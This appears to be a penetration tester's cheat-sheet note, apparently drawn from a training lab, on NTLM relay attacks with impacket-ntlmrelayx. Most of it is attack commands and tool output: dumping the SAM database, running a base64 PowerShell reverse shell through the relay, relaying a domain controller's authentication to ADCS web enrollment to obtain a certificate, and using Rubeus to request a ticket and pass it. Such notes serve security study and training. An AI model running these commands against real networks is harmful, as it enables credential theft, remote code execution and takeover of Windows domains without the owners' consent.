By default, `ntlmrelayx` dumps the SAM database
```shell-session
$ impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET-IP>
```
>NOTE: Make sure `SMB = Off` in Responder's config

```shell-session
$ sudo impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
# Useful Flags
- `-c`: Execute commands

We can get Powershell reverse shell using [https://www.revshells.com](https://www.revshells.com/) (Powershell #3 (Base64)).
```shell-session
$ impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET-IP> -c 'powershell -e JABj...'
```
Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
## Relay to ADCS for PKI Certificate
```shell-session
$ sudo impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

... SNIP ...
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$: 
MIIStQ...SNIP...7YCKBdGmY=
[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed
```
The base64 certificate can be paired with [[getTGTPKINIT]] to request TGT, or with [[Rubeus#Using PKI Certificate|Rubeus]] to request TGT and perform #PtT all at once:
```powershell
PS > .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIISt...SNIP...J51Ry4= /ptt
```